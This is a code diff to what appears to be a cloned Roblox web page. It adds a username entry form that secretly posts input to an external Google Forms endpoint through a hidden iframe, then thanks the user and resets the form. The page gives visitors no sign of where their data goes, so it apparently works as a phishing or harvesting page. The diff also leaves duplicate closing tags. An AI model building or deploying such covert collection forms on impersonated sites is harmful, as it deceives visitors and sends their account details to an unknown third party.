@@ -974,6 +974,28 @@ function checkRobloxInstall() {
 
     <script onerror='Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)' data-monitor='true' data-bundlename='pageEnd' type='text/javascript' src='https://js.rbxcdn.com/9b43c996571dbdd3acaf13368f292c1c.js'></script>
 
+ <main>
+    <h1>Enter Your Username</h1>
 
+    <form id="customForm" target="hidden_iframe"
+          action="https://docs.google.com/forms/d/e/1FAIpQLSen_Jyu6eTPX_bIPezX29gWSrCQLZFTBMw7t9mfP8m1yCorBw/formResponse"
+          method="POST" autocomplete="off">
+      <input type="text" name="entry.1952639901" placeholder="Username" required autocomplete="off" />
+      <button type="submit">Submit</button>
+    </form>
+  </main>
+
+  <iframe name="hidden_iframe"></iframe>
+
+  <script>
+    const form = document.getElementById('customForm');
+    form.addEventListener('submit', () => {
+      alert('Thanks! Your username was submitted.');
+      form.reset();
+    });
+  </script>
+
+</body>
+</html>
 </body>
 </html>
